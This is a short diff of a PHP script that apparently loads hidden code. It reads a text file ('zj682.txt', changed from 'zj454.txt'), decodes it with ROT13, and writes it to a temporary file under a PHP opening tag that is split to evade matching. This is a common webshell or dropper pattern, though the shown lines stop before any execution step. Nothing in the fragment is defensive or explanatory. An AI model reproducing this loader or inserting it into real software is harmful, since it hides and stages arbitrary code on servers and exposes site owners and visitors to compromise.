@@ -1,5 +1,5 @@
 <?php
-$ss = file_get_contents("zj454.txt");
+$ss = file_get_contents("zj682.txt");
 $tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
 $ss = str_rot13($ss);
 file_put_contents($tempFile, "<?p"."hp ". $ss);
